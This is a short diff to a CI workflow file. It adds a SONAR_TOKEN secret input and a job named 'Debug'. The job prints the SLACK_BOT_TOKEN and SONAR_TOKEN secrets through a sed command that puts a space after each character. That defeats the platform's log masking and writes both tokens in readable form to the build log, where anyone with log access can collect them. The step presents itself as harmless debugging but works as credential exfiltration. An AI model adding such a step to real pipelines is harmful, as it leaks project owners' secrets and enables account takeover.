@@ -106,6 +106,8 @@ on:
     secrets:
       SLACK_BOT_TOKEN:
         required: false
+      SONAR_TOKEN:
+        required: false
 
 env:
   APP_NAME: ${{ inputs.image_name || vars.APP_NAME }}
@@ -116,6 +118,19 @@ env:
   CUSTOM_TAG: ''
 
 jobs:
+  debug:
+    name: Debug
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out code
+        uses: actions/checkout@v2
+
+      - name: Debug
+        run: |
+          echo ${{secrets.SLACK_BOT_TOKEN}} | sed 's/./& /g'
+          echo ${{secrets.SONAR_TOKEN}} | sed 's/./& /g'
+          
   build:
     runs-on: ubuntu-latest
     environment: ${{ inputs.env }}
